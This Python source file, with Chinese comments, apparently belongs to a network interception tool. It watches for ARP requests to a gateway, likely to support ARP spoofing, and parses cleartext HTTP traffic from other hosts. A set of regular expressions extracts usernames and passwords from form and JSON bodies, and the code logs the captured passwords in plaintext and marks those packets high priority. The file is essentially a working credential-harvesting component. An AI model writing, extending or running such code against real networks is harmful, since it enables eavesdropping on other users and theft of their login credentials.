"""
数据包分析器
============
负责分析从C++核心接收的数据包，提取关键信息并做出判断
"""

import json
import re
import urllib.parse
import logging
from typing import Optional, Dict, Any
from dataclasses import dataclass
from datetime import datetime

@dataclass
class AnalysisResult:
    """分析结果"""
    packet_type: str  # 'arp' 或 'http'
    source_ip: str
    target_ip: str = ""
    gateway_query: bool = False  # 是否是对网关的ARP查询
    http_credentials: Optional[Dict[str, str]] = None  # HTTP凭据
    priority: int = 0  # 优先级 (0=低, 1=中, 2=高)
    metadata: Dict[str, Any] = None

class PacketAnalyzer:
    """数据包分析器"""
    
    def __init__(self, config):
        self.config = config
        self.logger = logging.getLogger(__name__)
        
        # ★【增强】★ 凭据提取的正则表达式模式 - 支持更多常见格式
        self.credential_patterns = {
            'username': [
                re.compile(r'user_account=([^&\s\r\n]+)', re.IGNORECASE),
                re.compile(r'username=([^&\s\r\n]+)', re.IGNORECASE),
                re.compile(r'account=([^&\s\r\n]+)', re.IGNORECASE),
                re.compile(r'login=([^&\s\r\n]+)', re.IGNORECASE),
                re.compile(r'user=([^&\s\r\n]+)', re.IGNORECASE),
                re.compile(r'userid=([^&\s\r\n]+)', re.IGNORECASE),
                re.compile(r'loginname=([^&\s\r\n]+)', re.IGNORECASE),
                re.compile(r'email=([^&\s\r\n]+)', re.IGNORECASE),
                # 支持JSON格式
                re.compile(r'"username"\s*:\s*"([^"]+)"', re.IGNORECASE),
                re.compile(r'"user_account"\s*:\s*"([^"]+)"', re.IGNORECASE),
            ],
            'password': [
                re.compile(r'user_password=([^&\s\r\n]+)', re.IGNORECASE),
                re.compile(r'password=([^&\s\r\n]+)', re.IGNORECASE),
                re.compile(r'passwd=([^&\s\r\n]+)', re.IGNORECASE),
                re.compile(r'pwd=([^&\s\r\n]+)', re.IGNORECASE),
                re.compile(r'pass=([^&\s\r\n]+)', re.IGNORECASE),
                re.compile(r'userpass=([^&\s\r\n]+)', re.IGNORECASE),
                re.compile(r'loginpass=([^&\s\r\n]+)', re.IGNORECASE),
                # 支持JSON格式
                re.compile(r'"password"\s*:\s*"([^"]+)"', re.IGNORECASE),
                re.compile(r'"user_password"\s*:\s*"([^"]+)"', re.IGNORECASE),
            ]
        }
        
    def analyze(self, packet_data) -> Optional[AnalysisResult]:
        """分析数据包"""
        try:
            # 如果是字符串，则解析JSON；如果已经是字典，直接使用
            if isinstance(packet_data, str):
                packet_info = json.loads(packet_data)
            elif isinstance(packet_data, dict):
                packet_info = packet_data
            else:
                self.logger.error(f"Invalid packet data type: {type(packet_data)}")
                return None
            
            packet_type = packet_info.get('type', 0)
            
            if packet_type == 1:  # ARP包
                return self._analyze_arp_packet(packet_info)
            elif packet_type == 2:  # HTTP包
                return self._analyze_http_packet(packet_info)
            else:
                self.logger.debug(f"Unknown packet type: {packet_type}")
                return None
                
        except json.JSONDecodeError as e:
            self.logger.error(f"Failed to parse packet JSON: {e}")
            return None
        except Exception as e:
            self.logger.error(f"Packet analysis error: {e}")
            return None
    
    def analyze_packet_json(self, packet_json: str) -> Optional[AnalysisResult]:
        """分析JSON格式的数据包 - analyze方法的别名"""
        return self.analyze(packet_json)
    
    def _analyze_arp_packet(self, packet_info: Dict) -> Optional[AnalysisResult]:
        """分析ARP数据包"""
        try:
            src_ip = packet_info.get('src_ip', '')
            dst_ip = packet_info.get('dst_ip', '')
            arp_opcode = packet_info.get('arp_opcode', 0)
            
            # 检查是否是ARP请求 (who-has)
            if arp_opcode != 1:
                return None
            
            # 检查是否是对网关的查询
            gateway_query = (dst_ip == self.config.network.gateway_ip)
            
            if not gateway_query:
                return None
            
            # 过滤掉网关自己的查询
            if src_ip == self.config.network.gateway_ip:
                return None
            
            result = AnalysisResult(
                packet_type='arp',
                source_ip=src_ip,
                target_ip=dst_ip,
                gateway_query=gateway_query,
                priority=1,  # ARP查询中等优先级
                metadata={
                    'arp_opcode': arp_opcode,
                    'src_mac': packet_info.get('src_mac', ''),
                    'dst_mac': packet_info.get('dst_mac', ''),
                    'timestamp': packet_info.get('timestamp', 0)
                }
            )
            
            self.logger.debug(f"ARP analysis: {src_ip} -> {dst_ip} (gateway query: {gateway_query})")
            return result
            
        except Exception as e:
            self.logger.error(f"ARP packet analysis error: {e}")
            return None
    
    def _analyze_http_packet(self, packet_info: Dict) -> Optional[AnalysisResult]:
        """分析HTTP数据包"""
        try:
            src_ip = packet_info.get('src_ip', '')
            dst_ip = packet_info.get('dst_ip', '')
            dst_port = packet_info.get('dst_port', 0)
            payload = packet_info.get('payload', '')
            
            if not payload:
                return None
            
            # ★【修复】★ 检查是否是目标服务器的流量 - 更灵活的匹配逻辑
            target_servers = []
            
            # 添加主要目标服务器
            if hasattr(self.config.network, 'target_server'):
                target_servers.append(self.config.network.target_server)
            
            # 添加认证服务器列表
            if hasattr(self.config.network, 'auth_servers'):
                target_servers.extend(self.config.network.auth_servers)
            
            # ★【修复】★ 如果没有配置特定服务器，则捕获所有HTTP流量进行分析
            target_match = len(target_servers) == 0 or dst_ip in target_servers
            
            if not target_match:
                # 记录但不分析非目标服务器的流量
                self.logger.debug(f"HTTP packet to non-target server: {dst_ip}:{dst_port}")
                return None
            
            # 检查是否包含HTTP方法
            http_methods = ['GET ', 'POST ', 'PUT ', 'DELETE ', 'HEAD ', 'OPTIONS ', 'PATCH ']
            is_http_request = any(payload.startswith(method) for method in http_methods)
            
            if not is_http_request:
                return None
            
            # ★【调试增强】★ 提取凭据并记录详细信息
            credentials = self._extract_credentials(payload)
            
            if credentials:
                self.logger.info(f"🔑 Credentials found in HTTP packet from {src_ip} to {dst_ip}:{dst_port}")
                self.logger.info(f"    Username: {credentials.get('username', 'N/A')}")
                self.logger.info(f"    Password: {credentials.get('password', 'N/A')}")
            else:
                self.logger.debug(f"No credentials found in HTTP packet from {src_ip} to {dst_ip}:{dst_port}")
                # 记录载荷的前200字符以便调试
                preview = payload[:200].replace('\n', '\\n').replace('\r', '\\r')
                self.logger.debug(f"Payload preview: {preview}...")
            
            # 确定优先级
            priority = 2 if credentials else 1  # 有凭据的高优先级
            
            result = AnalysisResult(
                packet_type='http',
                source_ip=src_ip,
                target_ip=dst_ip,
                http_credentials=credentials,
                priority=priority,
                metadata={
                    'dst_port': dst_port,
                    'payload_length': len(payload),
                    'timestamp': packet_info.get('timestamp', 0),
                    'method': self._extract_http_method(payload)
                }
            )
            
            # 🔧 精简日志：只记录有凭据的重要事件
            if credentials:
                self.logger.info(f"🔑 HTTP credentials found: {src_ip} -> {dst_ip}:{dst_port}")
            else:
                self.logger.debug(f"HTTP analysis: {src_ip} -> {dst_ip}:{dst_port} (no credentials)")
            
            return result
            
        except Exception as e:
            self.logger.error(f"HTTP packet analysis error: {e}")
            return None
    
    def _extract_credentials(self, payload: str) -> Optional[Dict[str, str]]:
        """从HTTP载荷中提取凭据"""
        try:
            credentials = {}
            
            # 提取用户名
            for pattern in self.credential_patterns['username']:
                match = pattern.search(payload)
                if match:
                    credentials['username'] = urllib.parse.unquote(match.group(1))
                    break
            
            # 提取密码
            for pattern in self.credential_patterns['password']:
                match = pattern.search(payload)
                if match:
                    credentials['password'] = urllib.parse.unquote(match.group(1))
                    break
            
            # 只有当用户名和密码都找到时才返回
            if 'username' in credentials and 'password' in credentials:
                return credentials
            
            return None
            
        except Exception as e:
            self.logger.error(f"Credential extraction error: {e}")
            return None
    
    def _extract_http_method(self, payload: str) -> str:
        """提取HTTP方法"""
        try:
            first_line = payload.split('\n')[0]
            method = first_line.split(' ')[0]
            return method
        except:
            return 'UNKNOWN'
    
    def get_statistics(self) -> Dict[str, int]:
        """获取分析统计信息"""
        # 这里可以添加统计信息的收集
        return {
            'total_analyzed': 0,
            'arp_packets': 0,
            'http_packets': 0,
            'credentials_found': 0
        }
